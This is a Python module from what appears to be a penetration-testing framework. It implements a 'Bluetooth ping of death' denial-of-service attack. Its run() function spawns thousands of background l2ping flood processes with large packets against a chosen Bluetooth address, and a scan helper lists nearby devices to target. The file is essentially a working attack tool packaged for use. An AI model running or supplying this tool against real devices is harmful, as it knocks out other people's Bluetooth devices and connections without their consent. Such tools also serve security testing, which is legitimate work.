#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import os
import subprocess
import time
from core import colors
from collections import OrderedDict

conf = {
	"name": "bluetooth_pod",
	"version": "1.0",
	"shortdesc": "bluetooth ping of death",
	"github": "4shadoww",
	"author": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "24.2.2016",
	"lastmod": "27.12.2016",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "hcitool", "l2ping"]

}


# List of variables
variables = OrderedDict((
	('interface', ['hci0', 'interface']),
	('bdaddr', ['none', 'target bluetooth address']),
	('size', ['600', 'size of packets (default 600)']),
))

# Custom commands
customcommands = {
	'scan': 'scan for devices'
}

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(colors.blue + "[*] Bluetooth Ping Of Death Attack Started ..." + colors.end)
	try:
		for i in range(1, 10000):
			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			time.sleep(3)
	except(OSError):
		print(colors.red + "[*] Something Is Wrong!" + colors.end)


def scan(args):
	os.system("hcitool scan")